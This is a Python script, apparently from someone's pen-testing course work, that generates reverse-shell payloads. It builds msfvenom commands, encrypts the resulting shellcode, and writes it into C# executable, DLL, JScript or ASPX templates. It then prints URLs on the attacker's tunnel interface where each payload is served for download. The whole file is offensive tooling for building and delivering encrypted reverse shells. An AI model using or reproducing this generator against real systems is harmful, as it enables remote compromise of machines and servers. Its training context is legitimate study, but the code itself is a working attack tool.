#!/usr/bin/python3

import subprocess
from lib.functions import generate_command, get_payload
from lib.shellcode import encrypt_shellcode, build_revshell
from temps.cs_templates import templates_dict
import netifaces
import os


def main(args):
    base_paths = ["/home/tijmen/pen300/smbshare/source", "/home/tijmen/pen300/www/pl"]

    payload = get_payload(args.format, args.arch, args.conn)
    command = generate_command(payload, args)

    shellcode = generate_shellcode(command, args.format)
    if not shellcode:
        raise ValueError("Shellcode not generate")

    generate_payload(args, command, shellcode, base_paths)
    if args.template not in ["aspx"]:
        build_revshell(args.template, args.arch)


def generate_shellcode(command, format):
    try:
        encrypted_shellcode = encrypt_shellcode(command, format)
        buf = f'byte[] buf = new byte[{len(encrypted_shellcode)}] {{{",".join(encrypted_shellcode)}}};'
        return buf
    except subprocess.CalledProcessError as e:
        raise ValueError(f"An error occurred while executing the command: {e}")


def generate_payload(args, command, shellcode, base_paths):
    try:
        template = templates_dict[args.template]
    except Exception as e:
        raise ValueError("Unsupported template")
    
    try:
        if args.template in ["exe", "exe-ph", "exe-nomigrate"]:
            output_path = f"{base_paths[0]}/exec-revshell/exec-revshell.cs"
        elif args.template in ["dll", "dll-ph", "dll-nomigrate"]:
            output_path = f"{base_paths[0]}/dll-revshell/dll-revshell.cs"
        elif args.template in ["js", "js-ph"]:
            output_path = f"{base_paths[0]}/js-revshell/js-revshell.cs"
        elif args.template in ["aspx"]:
            output_path = f"{base_paths[1]}/iis-revshell.aspx"
        else:
            raise ValueError("I am not writing, to dangerous!")
        
        final_output = template.replace("SHELLCODE", shellcode)
        final_output = final_output.replace("MSFVENOM", " ".join(command))
        if args.template in ["aspx"]:
            final_output = final_output.replace("buf", "adelaar")

        if args.template in ["aspx"] and os.path.exists(output_path):
            os.remove(output_path)
        with open(output_path, "w") as file_obj:
            file_obj.write(final_output)
        if args.template not in ["js", "aspx"]:
            print(f"See '{output_path}' for the source-code\n")

        addresses = netifaces.ifaddresses('tun0')
        ip_address = addresses[netifaces.AF_INET][0]['addr']

        if args.template in ["exe", "exe-ph", "exe-nomigrate"]:
            print("Saved at: /home/tijmen/pen300/www/pl/exec-revshell.exe")
            print(f"Served at: http://{ip_address}/pl/exec-revshell.exe")
        elif args.template in ["dll", "dll-ph", "dll-nomigrate"]:
            print("Saved at: /home/tijmen/pen300/www/pl/dll-revshell.dll")
            print(f"Served at: http://{ip_address}/pl/dll-revshell.dll")
        elif args.template in ["aspx"]:
            print("Saved at: /home/tijmen/pen300/www/pl/iis-revshell.aspx")
            print(f"Served at: http://{ip_address}/pl/iis-revshell.aspx")

    except Exception as e:
        raise ValueError(f"Error creating the template: {e}")
